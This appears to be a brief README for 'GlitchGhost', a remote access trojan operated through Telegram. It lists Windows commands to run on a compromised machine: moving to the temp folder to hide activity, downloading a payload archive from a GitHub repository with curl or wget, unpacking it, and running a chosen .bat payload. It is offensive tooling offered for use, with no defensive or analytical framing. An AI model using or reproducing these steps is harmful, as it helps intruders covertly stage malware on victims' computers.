# GlitchGhost
Automated RAT access with Telegram.

<!-- After connection established; run for obsfucation-->
cd %TEMP%


<!-- download payloads from repository -->
curl -L -o "%TEMP%\pload.zip" https://github.com/Issac-dev/GlitchGhost/archive/refs/heads/main.zip
<!-- or -->
wget -O "%TEMP%\pload.zip" https://github.com/Issac-dev/GlitchGhost/archive/refs/heads/main.zip

<!-- create directory for upload -->
mkdir "%TEMP%\pload"


<!-- unzip folder -->
unzip "%TEMP%\pload.zip -d "%TEMP%\pload
<!-- or -->
tar -xf "%TEMP%\pload.zip" -C "%TEMP%\pload"


<!-- enter folder -->
cd %TEMP%\pload\GlitchGhost-main

<!-- look for payload you want and simply run it by typing the name of its corresponding .bat file -->


